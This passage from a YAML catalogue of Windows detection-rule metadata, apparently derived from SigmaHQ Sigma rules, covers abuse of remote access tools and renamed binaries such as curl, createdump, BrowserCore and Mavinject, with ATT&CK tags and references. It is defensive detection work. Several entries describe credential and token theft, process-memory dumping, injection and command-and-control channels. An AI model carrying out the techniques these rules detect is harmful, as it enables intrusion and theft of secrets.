    However, malicious actors may exploit these tools by renaming them to bypass detection
    mechanisms, enabling unauthorized access and control over compromised systems.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: experimental
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1036.003
  - T1219.002
  tags:
  - attack.command-and-control
  - attack.defense-evasion
  - attack.t1219.002
  - attack.t1036.003
  time_window: ''
  references:
  - https://www.huntress.com/blog/know-thy-enemy-a-novel-november-case-on-persistent-remote-access
  - https://thecyberexpress.com/ukraine-hit-by-meshagent-malware-campaign/
  - https://wazuh.com/blog/how-to-detect-meshagent-with-wazuh/
  - https://www.security.com/threat-intelligence/medusa-ransomware-attacks
  false_positives:
  - Unknown
  notes: ''
- detection_id: e01fa958-6893-41d4-ae03-182477c5e77d
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_remote_access_tools_rurat_non_default_location.yml
  name: Remote Access Tool - RURAT Execution From Unusual Location
  description: Detects execution of Remote Utilities RAT (RURAT) from an unusual location
    (outside of 'C:\Program Files')
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques: []
  tags:
  - attack.defense-evasion
  time_window: ''
  references:
  - https://redcanary.com/blog/misbehaving-rats/
  false_positives:
  - Unknown
  notes: ''
- detection_id: 57bff678-25d1-4d6c-8211-8ca106d12053
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_remote_access_tools_screenconnect.yml
  name: Remote Access Tool - ScreenConnect Execution
  description: 'An adversary may use legitimate desktop support and remote access
    software, such as Team Viewer, Go2Assist, LogMein, AmmyyAdmin, etc, to establish
    an interactive command and control channel to target systems within networks.

    These services are commonly used as legitimate technical support software, and
    may be allowed by application control within a target environment.

    Remote access tools like VNC, Ammyy, and Teamviewer are used frequently when compared
    with other legitimate software commonly used by adversaries. (Citation: Symantec
    Living off the Land)

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1219.002
  tags:
  - attack.command-and-control
  - attack.t1219.002
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1219/T1219.md#atomic-test-5---screenconnect-application-download-and-install-on-windows
  false_positives:
  - Legitimate usage of the tool
  notes: ''
- detection_id: 75bfe6e6-cd8e-429e-91d3-03921e1d7962
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_remote_access_tools_screenconnect_installation_cli_param.yml
  name: Remote Access Tool - ScreenConnect Installation Execution
  description: Detects ScreenConnect program starts that establish a remote access
    to a system.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1133
  tags:
  - attack.persistence
  - attack.initial-access
  - attack.t1133
  time_window: ''
  references:
  - https://www.anomali.com/blog/probable-iranian-cyber-actors-static-kitten-conducting-cyberespionage-campaign-targeting-uae-and-kuwait-government-agencies
  false_positives:
  - Legitimate use by administrative staff
  notes: ''
- detection_id: b1f73849-6329-4069-bc8f-78a604bb8b23
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_remote_access_tools_screenconnect_remote_execution.yml
  name: Remote Access Tool - ScreenConnect Remote Command Execution
  description: Detects the execution of a system command via the ScreenConnect RMM
    service.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: low
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1059.003
  tags:
  - attack.execution
  - attack.t1059.003
  time_window: ''
  references:
  - https://github.com/SigmaHQ/sigma/pull/4467
  false_positives:
  - Legitimate use of ScreenConnect. Disable this rule if ScreenConnect is heavily
    used.
  notes: ''
- detection_id: 7b582f1a-b318-4c6a-bf4e-66fe49bf55a5
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_remote_access_tools_screenconnect_remote_execution_susp.yml
  name: Remote Access Tool - ScreenConnect Potential Suspicious Remote Command Execution
  description: 'Detects potentially suspicious child processes launched via the ScreenConnect
    client service.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1219.002
  tags:
  - attack.command-and-control
  - attack.t1219.002
  time_window: ''
  references:
  - https://www.mandiant.com/resources/telegram-malware-iranian-espionage
  - https://docs.connectwise.com/ConnectWise_Control_Documentation/Get_started/Host_client/View_menu/Backstage_mode
  - https://www.huntress.com/blog/slashandgrab-screen-connect-post-exploitation-in-the-wild-cve-2024-1709-cve-2024-1708
  - https://www.trendmicro.com/en_us/research/24/b/threat-actor-groups-including-black-basta-are-exploiting-recent-.html
  false_positives:
  - If the script being executed make use of any of the utilities mentioned in the
    detection then they should filtered out or allowed.
  notes: ''
- detection_id: b19146a3-25d4-41b4-928b-1e2a92641b1b
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_remote_access_tools_screenconnect_webshell.yml
  name: Remote Access Tool - ScreenConnect Server Web Shell Execution
  description: Detects potential web shell execution from the ScreenConnect server
    process.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1190
  tags:
  - attack.initial-access
  - attack.t1190
  time_window: ''
  references:
  - https://blackpointcyber.com/resources/blog/breaking-through-the-screen/
  - https://www.connectwise.com/company/trust/security-bulletins/connectwise-screenconnect-23.9.8
  false_positives:
  - Unlikely
  notes: ''
- detection_id: 95e60a2b-4705-444b-b7da-ba0ea81a3ee2
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_remote_access_tools_simple_help.yml
  name: Remote Access Tool - Simple Help Execution
  description: 'An adversary may use legitimate desktop support and remote access
    software, such as Team Viewer, Go2Assist, LogMein, AmmyyAdmin, etc, to establish
    an interactive command and control channel to target systems within networks.

    These services are commonly used as legitimate technical support software, and
    may be allowed by application control within a target environment.

    Remote access tools like VNC, Ammyy, and Teamviewer are used frequently when compared
    with other legitimate software commonly used by adversaries. (Citation: Symantec
    Living off the Land)

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1219.002
  tags:
  - attack.command-and-control
  - attack.t1219.002
  time_window: ''
  references:
  - https://www.huntress.com/blog/slashandgrab-screen-connect-post-exploitation-in-the-wild-cve-2024-1709-cve-2024-1708
  false_positives:
  - Legitimate usage of the tool
  notes: ''
- detection_id: 2db93a3f-3249-4f73-9e68-0e77a0f8ae7e
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_remote_access_tools_tacticalrmm_agent_registration_via_cli.yml
  name: Remote Access Tool - TacticalRMM Agent Registration to Potentially Attacker-Controlled
    Server
  description: 'Detects TacticalRMM agent installations where the --api, --auth, and
    related flags are used on the command line.

    These parameters configure the agent to connect to a specific RMM server with
    authentication, client ID, and site ID.

    This technique could indicate a threat actor attempting to register the agent
    with an attacker-controlled RMM infrastructure silently.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 6
  predictive_readiness_factors:
  - sequence_or_progression_logic
  - time_window_aggregation
  severity: medium
  status: experimental
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1105
  - T1219
  tags:
  - attack.command-and-control
  - attack.t1219
  - attack.t1105
  time_window: ''
  references:
  - https://github.com/amidaware/tacticalrmm
  - https://apophis133.medium.com/powershell-script-tactical-rmm-installation-45afb639eff3
  false_positives:
  - Legitimate system administrator deploying TacticalRMM
  notes: ''
- detection_id: ab70c354-d9ac-4e11-bbb6-ec8e3b153357
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_remote_access_tools_teamviewer_incoming_connection.yml
  name: Remote Access Tool - Team Viewer Session Started On Windows Host
  description: 'Detects the command line executed when TeamViewer starts a session
    started by a remote host.

    Once a connection has been started, an investigator can verify the connection
    details by viewing the "incoming_connections.txt" log file in the TeamViewer folder.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: low
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1133
  tags:
  - attack.persistence
  - attack.initial-access
  - attack.t1133
  time_window: ''
  references:
  - Internal Research
  false_positives:
  - Legitimate usage of TeamViewer
  notes: ''
- detection_id: 88656cec-6c3b-487c-82c0-f73ebb805503
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_remote_access_tools_ultraviewer.yml
  name: Remote Access Tool - UltraViewer Execution
  description: 'An adversary may use legitimate desktop support and remote access
    software, such as Team Viewer, Go2Assist, LogMein, AmmyyAdmin, etc, to establish
    an interactive command and control channel to target systems within networks.

    These services are commonly used as legitimate technical support software, and
    may be allowed by application control within a target environment.

    Remote access tools like VNC, Ammyy, and Teamviewer are used frequently when compared
    with other legitimate software commonly used by adversaries. (Citation: Symantec
    Living off the Land)

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1219.002
  tags:
  - attack.command-and-control
  - attack.t1219.002
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1219/T1219.md
  false_positives:
  - Legitimate use
  notes: ''
- detection_id: b243b280-65fe-48df-ba07-6ddea7646427
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_remote_time_discovery.yml
  name: Discovery of a System Time
  description: Identifies use of various commands to query a systems time. This technique
    may be used before executing a scheduled task or to discover the time zone of
    a target system.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: low
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Discovery
  techniques:
  - T1124
  tags:
  - attack.discovery
  - attack.t1124
  time_window: ''
  references:
  - https://eqllib.readthedocs.io/en/latest/analytics/fcdb99c2-ac3c-4bde-b664-4b336329bed2.html
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1124/T1124.md
  false_positives:
  - Legitimate use of the system utilities to discover system time for legitimate
    reason
  notes: ''
- detection_id: df55196f-f105-44d3-a675-e9dfb6cc2f2b
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_renamed_adfind.yml
  name: Renamed AdFind Execution
  description: Detects the use of a renamed Adfind.exe. AdFind continues to be seen
    across majority of breaches. It is used to domain trust discovery to plan out
    subsequent steps in the attack chain.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 6
  predictive_readiness_factors:
  - sequence_or_progression_logic
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Discovery
  techniques:
  - T1018
  - T1069.002
  - T1087.002
  - T1482
  tags:
  - attack.discovery
  - attack.t1018
  - attack.t1087.002
  - attack.t1482
  - attack.t1069.002
  time_window: ''
  references:
  - https://www.joeware.net/freetools/tools/adfind/
  - https://thedfirreport.com/2020/05/08/adfind-recon/
  - https://thedfirreport.com/2021/01/11/trickbot-still-alive-and-well/
  - https://www.microsoft.com/security/blog/2021/01/20/deep-dive-into-the-solorigate-second-stage-activation-from-sunburst-to-teardrop-and-raindrop/
  - https://social.technet.microsoft.com/wiki/contents/articles/7535.adfind-command-examples.aspx
  - https://github.com/center-for-threat-informed-defense/adversary_emulation_library/blob/bf62ece1c679b07b5fb49c4bae947fe24c81811f/fin6/Emulation_Plan/Phase1.md
  false_positives:
  - Unknown
  notes: ''
- detection_id: 0f16d9cf-0616-45c8-8fad-becc11b5a41c
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_renamed_autohotkey.yml
  name: Renamed AutoHotkey.EXE Execution
  description: Detects execution of a renamed autohotkey.exe binary based on PE metadata
    fields
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques: []
  tags:
  - attack.defense-evasion
  time_window: ''
  references:
  - https://www.autohotkey.com/download/
  - https://thedfirreport.com/2023/02/06/collect-exfiltrate-sleep-repeat/
  false_positives:
  - Unknown
  notes: ''
- detection_id: f4264e47-f522-4c38-a420-04525d5b880f
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_renamed_autoit.yml
  name: Renamed AutoIt Execution
  description: 'Detects the execution of a renamed AutoIt2.exe or AutoIt3.exe.

    AutoIt is a scripting language and automation tool for Windows systems. While
    primarily used for legitimate automation tasks, it can be misused in cyber attacks.

    Attackers can leverage AutoIt to create and distribute malware, including keyloggers,
    spyware, and botnets. A renamed AutoIt executable is particularly suspicious.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  - guardrail:ioc_only_cap
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1027
  tags:
  - attack.defense-evasion
  - attack.t1027
  time_window: ''
  references:
  - https://twitter.com/malmoeb/status/1665463817130725378?s=12&t=C0_T_re0wRP_NfKa27Xw9w
  - https://www.autoitscript.com/site/
  false_positives:
  - Unknown
  notes: ''
- detection_id: 36480ae1-a1cb-4eaa-a0d6-29801d7e9142
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_renamed_binary.yml
  name: Potential Defense Evasion Via Binary Rename
  description: Detects the execution of a renamed binary often used by attackers or
    malware leveraging new Sysmon OriginalFileName datapoint.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 5
  predictive_readiness_factors:
  - time_window_aggregation
  - distinct_or_novel_entity_logic
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1036.003
  tags:
  - attack.defense-evasion
  - attack.t1036.003
  time_window: ''
  references:
  - https://mgreen27.github.io/posts/2019/05/12/BinaryRename.html
  - https://mgreen27.github.io/posts/2019/05/29/BinaryRename2.html
  - https://github.com/redcanaryco/atomic-red-team/blob/0f229c0e42bfe7ca736a14023836d65baa941ed2/atomics/T1036.003/T1036.003.md#atomic-test-1---masquerading-as-windows-lsass-process
  - https://www.splunk.com/en_us/blog/security/inno-setup-malware-redline-stealer-campaign.html
  false_positives:
  - Custom applications use renamed binaries adding slight change to binary name.
    Typically this is easy to spot and add to whitelist
  notes: ''
- detection_id: 0ba1da6d-b6ce-4366-828c-18826c9de23e
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_renamed_binary_highly_relevant.yml
  name: Potential Defense Evasion Via Rename Of Highly Relevant Binaries
  description: Detects the execution of a renamed binary often used by attackers or
    malware leveraging new Sysmon OriginalFileName datapoint.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 5
  predictive_readiness_factors:
  - time_window_aggregation
  - distinct_or_novel_entity_logic
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1036.003
  tags:
  - attack.defense-evasion
  - attack.t1036.003
  - car.2013-05-009
  time_window: ''
  references:
  - https://mgreen27.github.io/posts/2019/05/12/BinaryRename.html
  - https://mgreen27.github.io/posts/2019/05/29/BinaryRename2.html
  - https://www.trendmicro.com/vinfo/hk-en/security/news/cybercrime-and-digital-threats/megacortex-ransomware-spotted-attacking-enterprise-networks
  - https://twitter.com/christophetd/status/1164506034720952320
  - https://threatresearch.ext.hp.com/svcready-a-new-loader-reveals-itself/
  false_positives:
  - Custom applications use renamed binaries adding slight change to binary name.
    Typically this is easy to spot and add to whitelist
  - PsExec installed via Windows Store doesn't contain original filename field (False
    negative)
  notes: ''
- detection_id: 30d07da2-83ab-45d8-ae75-ec7c0edcaffc
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_renamed_boinc.yml
  name: Renamed BOINC Client Execution
  description: Detects the execution of a renamed BOINC binary.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1553
  tags:
  - attack.defense-evasion
  - attack.t1553
  time_window: ''
  references:
  - https://boinc.berkeley.edu/
  - https://www.virustotal.com/gui/file/91e405e8a527023fb8696624e70498ae83660fe6757cef4871ce9bcc659264d3/details
  - https://www.huntress.com/blog/fake-browser-updates-lead-to-boinc-volunteer-computing-software
  false_positives:
  - Unknown
  notes: ''
- detection_id: 8a4519e8-e64a-40b6-ae85-ba8ad2177559
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_renamed_browsercore.yml
  name: Renamed BrowserCore.EXE Execution
  description: Detects process creation with a renamed BrowserCore.exe (used to extract
    Azure tokens)
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1036.003
  - T1528
  tags:
  - attack.credential-access
  - attack.defense-evasion
  - attack.t1528
  - attack.t1036.003
  time_window: ''
  references:
  - https://twitter.com/mariuszbit/status/1531631015139102720
  false_positives:
  - Unknown
  notes: ''
- detection_id: e0c69ebd-b54f-4aed-8ae3-e3467843f3f0
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_renamed_cloudflared.yml
  name: Renamed Cloudflared.EXE Execution
  description: Detects the execution of a renamed "cloudflared" binary.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  - guardrail:ioc_only_cap
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1090.001
  tags:
  - attack.command-and-control
  - attack.t1090.001
  time_window: ''
  references:
  - https://github.com/cloudflare/cloudflared/releases
  - https://developers.cloudflare.com/cloudflare-one/connections/connect-networks/do-more-with-tunnels/trycloudflare/
  - https://github.com/cloudflare/cloudflared
  - https://www.intrinsec.com/akira_ransomware/
  - https://www.guidepointsecurity.com/blog/tunnel-vision-cloudflared-abused-in-the-wild/
  false_positives:
  - Unknown
  notes: ''
- detection_id: 1a1ed54a-2ba4-4221-94d5-01dee560d71e
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_renamed_createdump.yml
  name: Renamed CreateDump Utility Execution
  description: Detects uses of a renamed legitimate createdump.exe LOLOBIN utility
    to dump process memory
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1003.001
  - T1036
  tags:
  - attack.defense-evasion
  - attack.t1036
  - attack.t1003.001
  - attack.credential-access
  time_window: ''
  references:
  - https://www.crowdstrike.com/blog/overwatch-exposes-aquatic-panda-in-possession-of-log-4-shell-exploit-tools/
  - https://twitter.com/bopin2020/status/1366400799199272960
  false_positives:
  - Command lines that use the same flags
  notes: ''
- detection_id: 7530cd3d-7671-43e3-b209-976966f6ea48
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_renamed_curl.yml
  name: Renamed CURL.EXE Execution
  description: Detects the execution of a renamed "CURL.exe" binary based on the PE
    metadata fields
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1059
  - T1202
  tags:
  - attack.execution
  - attack.t1059
  - attack.defense-evasion
  - attack.t1202
  time_window: ''
  references:
  - https://twitter.com/Kostastsale/status/1700965142828290260
  false_positives:
  - Unknown
  notes: ''
- detection_id: 340a090b-c4e9-412e-bb36-b4b16fe96f9b
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_renamed_dctask64.yml
  name: Renamed ZOHO Dctask64 Execution
  description: 'Detects a renamed "dctask64.exe" execution, a signed binary by ZOHO
    Corporation part of ManageEngine Endpoint Central.

    This binary can be abused for DLL injection, arbitrary command and process execution.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  - guardrail:ioc_only_cap
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1036
  - T1055.001
  - T1202
  - T1218
  tags:
  - attack.privilege-escalation
  - attack.defense-evasion
  - attack.t1036
  - attack.t1055.001
  - attack.t1202
  - attack.t1218
  time_window: ''
  references:
  - https://twitter.com/gN3mes1s/status/1222088214581825540
  - https://twitter.com/gN3mes1s/status/1222095963789111296
  - https://twitter.com/gN3mes1s/status/1222095371175911424
  false_positives:
  - Unknown
  notes: ''
- detection_id: 277a4393-446c-449a-b0ed-7fdc7795244c
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_renamed_ftp.yml
  name: Renamed FTP.EXE Execution
  description: Detects the execution of a renamed "ftp.exe" binary based on the PE
    metadata fields
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1059
  - T1202
  tags:
  - attack.execution
  - attack.t1059
  - attack.defense-evasion
  - attack.t1202
  time_window: ''
  references:
  - https://lolbas-project.github.io/lolbas/Binaries/Ftp/
  false_positives:
  - Unknown
  notes: ''
- detection_id: ec0722a3-eb5c-4a56-8ab2-bf6f20708592
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_renamed_gpg4win.yml
  name: Renamed Gpg.EXE Execution
  description: Detects the execution of a renamed "gpg.exe". Often used by ransomware
    and loaders to decrypt/encrypt data.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Impact
  techniques:
  - T1486
  tags:
  - attack.impact
  - attack.t1486
  time_window: ''
  references:
  - https://securelist.com/locked-out/68960/
  false_positives: []
  notes: ''
- detection_id: edd8a48c-1b9f-4ba1-83aa-490338cd1ccb
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_renamed_jusched.yml
  name: Renamed Jusched.EXE Execution
  description: Detects the execution of a renamed "jusched.exe" as seen used by the
    cobalt group
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1036.003
  tags:
  - attack.execution
  - attack.defense-evasion
  - attack.t1036.003
  time_window: ''
  references:
  - https://www.bitdefender.com/files/News/CaseStudies/study/262/Bitdefender-WhitePaper-An-APT-Blueprint-Gaining-New-Visibility-into-Financial-Threats-interactive.pdf
  false_positives:
  - Unknown
  notes: ''
- detection_id: e6474a1b-5390-49cd-ab41-8d88655f7394
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_renamed_mavinject.yml
  name: Renamed Mavinject.EXE Execution
  description: Detects the execution of a renamed version of the "Mavinject" process.
    Which can be abused to perform process injection using the "/INJECTRUNNING" flag
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1055.001
  - T1218.013
  tags:
  - attack.defense-evasion
  - attack.privilege-escalation
  - attack.t1055.001
  - attack.t1218.013
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1218/T1218.md
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1056.004/T1056.004.md
  - https://posts.specterops.io/mavinject-exe-functionality-deconstructed-c29ab2cf5c0e
  - https://twitter.com/gN3mes1s/status/941315826107510784
  - https://reaqta.com/2017/12/mavinject-microsoft-injector/
  - https://twitter.com/Hexacorn/status/776122138063409152
  - https://github.com/SigmaHQ/sigma/issues/3742
  - https://github.com/keyboardcrunch/SentinelOne-ATTACK-Queries/blob/6a228d23eefe963ca81f2d52f94b815f61ef5ee0/Tactics/DefenseEvasion.md#t1055-process-injection
  false_positives:
  - Unlikely
  notes: ''
- detection_id: 643bdcac-8b82-49f4-9fd9-25a90b929f3b
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_renamed_megasync.yml
  name: Renamed MegaSync Execution
  description: Detects the execution of a renamed MegaSync.exe as seen used by ransomware
    families like Nefilim, Sodinokibi, Pysa, and Conti.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1218
  tags:
  - attack.defense-evasion
  - attack.t1218
  time_window: ''
  references:
  - https://redcanary.com/blog/rclone-mega-extortion/
  false_positives:
  - Software that illegally integrates MegaSync in a renamed form
  - Administrators that have renamed MegaSync
  notes: ''
- detection_id: bd1c6866-65fc-44b2-be51-5588fcff82b9
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_renamed_msdt.yml
  name: Renamed Msdt.EXE Execution
  description: Detects the execution of a renamed "Msdt.exe" binary
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1036.003
  tags:
  - attack.defense-evasion
  - attack.t1036.003
  time_window: ''
  references:
  - https://lolbas-project.github.io/lolbas/Binaries/Msdt/
  false_positives:
  - Unlikely
  notes: ''
- detection_id: 88f46b67-14d4-4f45-ac2c-d66984f22191
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_renamed_msteams.yml
  name: Renamed Microsoft Teams Execution
  description: Detects the execution of a renamed Microsoft Teams binary.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques: []
  tags:
  - attack.defense-evasion
  time_window: ''
  references:
  - Internal Research
  false_positives:
  - Unknown
  notes: ''
- detection_id: 0afbd410-de03-4078-8491-f132303cb67d
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_renamed_netsupport_rat.yml
  name: Renamed NetSupport RAT Execution
  description: Detects the execution of a renamed "client32.exe" (NetSupport RAT)
    via Imphash, Product and OriginalFileName strings
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
